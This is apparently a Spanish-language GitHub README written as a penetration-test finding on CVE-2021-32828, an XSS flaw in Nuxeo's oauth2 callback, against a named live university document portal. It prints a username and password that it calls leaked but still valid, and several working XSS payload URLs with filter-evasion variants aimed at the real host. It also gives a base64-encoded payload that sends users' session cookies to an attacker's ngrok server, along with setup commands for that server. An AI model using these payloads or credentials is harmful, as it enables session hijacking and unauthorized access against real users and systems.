# Nuxeo-Vulnerable-a-XXS











Para poder capturar la informacion esnecesario crear un servidor donde se alojara el **Payload** con la Reverse Shell, para esto se necesita tener instalado y configurado Ngrok se puede hacer tal como se hace aqui https://github.com/Yonathan808/Iniciar-Servidor-Ngrok/blob/main/README.md

### Iniciar Servicios

Abre dos terminales o pestañas separadas para ejecutar los siguientes comandos:

1. **Iniciar túnel con Ngrok en el puerto 80:**

```bash
ngrok http 80
```

2. **Iniciar servidor web en el puerto 80:**

```bash
python3 -m http.server 80
```

Unicamente hay que cargar el payload en la misma carpeta donde creamos el servicio http





________________________________________


## Hallazgo: Nuxeo - XSS escalada a RCE (CVE-2021-32828)

### 1. Acceso inicial a la plataforma

Se accedió al portal institucional de Nuxeo mediante la siguiente URL:

https://documental.portaloas.udistrital.edu.co/nuxeo/login.jsp?requestedUrl=ui%2F

Allí se cargó correctamente la interfaz gráfica de inicio de sesión de Nuxeo.

![Interfaz gráfica login Nuxeo](/images/name/image-WOanJdHL.png)

Se utilizaron credenciales filtradas y aún válidas:

Usuario: desarrollooas  
Contraseña: desarrollooas2019

El navegador (Google Chrome) advirtió que dichas credenciales han sido comprometidas en filtraciones previas:

![Advertencia de Chrome sobre credenciales filtradas](/images/name/image-jJVecXAH.png)

---

### 2. Exploración y descubrimiento del motor web

Durante la navegación autenticada, se identificó la raíz del sistema bajo el motor Nuxeo Web Engine.

![Interfaz Nuxeo Web Engine](/images/name/image-bCg4hNS1.png)

Aunque no se logró identificar con precisión la versión exacta del sistema, se realizó una enumeración de directorios relevantes. Se encontró un patrón común: el uso de rutas relacionadas con OAuth, específicamente en la ruta:

/nuxeo/site/oauth2/

OAuth (Open Authorization) es un protocolo que permite el acceso controlado a recursos de usuario sin necesidad de compartir sus credenciales.

![Enumeración de directorios relevantes](/images/name/image-GTzFZFl1.png)

---

### 3. Identificación de vulnerabilidad (CVE-2021-32828)

Se investigaron vulnerabilidades conocidas relacionadas con Nuxeo y OAuth, encontrando la siguiente:

CVE-2021-32828: En versiones anteriores a la 11.5.109, la API REST /oauth2 es vulnerable a ataques Cross-Site Scripting (XSS). Esta vulnerabilidad puede ser escalada a Remote Code Execution (RCE) a través de la API de automatización.

Referencia oficial de GitHub Security Lab:  
https://securitylab.github.com/advisories/GHSL-2021-072-nuxeo

![Referencia CVE](/images/name/image-oXBJZByq.png)

El endpoint afectado es:  
/nuxeo/site/oauth2/{serviceProviderName}/callback

---

### 4. Prueba de concepto (XSS básico)

Se probó un payload XSS estándar directamente en el endpoint vulnerable:

https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/%3Cimg%20src%20onerror=alert(document.domain)%3E/callback

Este generó correctamente un alert en el navegador, confirmando la ejecución del código inyectado:

![Alerta generada por XSS exitoso](/images/name/image-KGStg2qU.png)

---

### 5. Intento de escalada a RCE (script externo)

Basado en el artículo técnico de Álvaro Muñoz publicado en el blog de GitHub, se intentó cargar un script remoto que ejecuta código JavaScript dinámico usando el hash de la URL:

http://localhost:8080/nuxeo/site/oauth2/<img src onerror=a=document.createElement('script');a.setAttribute('src',document.location.hash.substr(1));document.head.appendChild(a)>/callback#//attacker.ngrok.io/exploit.js

Este intento no funcionó, ya que el código fue tratado como texto plano.

---

### 6. Pruebas adicionales de evasión XSS

Se exploraron diferentes vectores de XSS para evadir posibles filtros. A continuación se enumeran las pruebas más relevantes y su resultado:

- IMG con eval + base64:  
  https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/<img src=x onerror=eval(atob("YWxlcnQoJ1hTUycp"))>/callback  
  Decodificado: alert('XSS')  
  Resultado: Exitoso

- SVG con onload:  
  https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/<svg onload=eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))>/callback  
  Decodificado: alert(document.cookie)  
  Resultado: Exitoso

- IMG con atributo hexadecimal:  
  https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/<img src=x o%6Eerror=alert(1)>/callback  
  Resultado: Exitoso

- IMG con acceso al DOM:  
  https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/<img src=x onerror=alert(document.body.innerHTML)>/callback  
  Resultado: Exitoso

De estas pruebas se concluyó que los payloads basados en esta plantilla son los más efectivos:

<img src=x onerror=eval(atob("COMANDO_EN_BASE64"))>

---

### 7. Recolección de datos vía XSS

Se preparó un entorno para capturar información enviada desde el navegador víctima.

Paso 1: Iniciar túnel con Ngrok

ngrok http 80

Paso 2: Iniciar servidor HTTP

python3 -m http.server 80

---

### 8. Ejecución del XSS con exfiltración de cookies

Se utilizó el siguiente payload para exfiltrar cookies:

https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22aT1uZXcgSW1hZ2UoKTtpLnNyYz0iaHR0cHM6Ly9hNTZmYWE1ZDcyYjIubmdyb2stZnJlZS5hcHAvbG9nP2M9Iitkb2N1bWVudC5jb29raWU7%22))%3E/callback

Decodificado:

i = new Image();  
i.src = "https://a56faa5d72b2.ngrok-free.app/log?c=" + document.cookie;

La solicitud fue recibida correctamente en el servidor controlado por el atacante:

![Payload con base64 en la URL](/images/name/image-D8bfOXVj.png)  
![Petición recibida en el servidor remoto](/images/name/image-zSdZcElN.png)

---

### 9. Análisis de impacto

Se compararon las cookies recibidas con las cookies del navegador víctima. Se confirmó que:

- Las cookies no tienen la bandera HttpOnly.
- Las cookies no tienen la bandera Secure.
- Son accesibles desde JavaScript.
- Fueron enviadas exitosamente al servidor externo.

![Comparación cookies víctima vs capturadas](/images/name/image-ynoDslmW.png)

---

### Conclusión

La instancia Nuxeo expuesta en `documental.portaloas.udistrital.edu.co` contiene una vulnerabilidad crítica de tipo XSS en el endpoint `/site/oauth2/{serviceProviderName}/callback`. Esta vulnerabilidad (CVE-2021-32828) permite la ejecución arbitraria de código JavaScript y la exfiltración de información sensible como cookies de sesión.

Al no contar con las banderas de seguridad adecuadas (`HttpOnly`, `Secure`), las cookies pueden ser robadas y utilizadas para secuestrar sesiones de usuarios autenticados. Si la sesión tiene privilegios elevados, esto podría derivar en la ejecución remota de comandos o acciones críticas en el sistema afectado.

Referencia técnica:  
https://securitylab.github.com/advisories/GHSL-2021-072-nuxeo





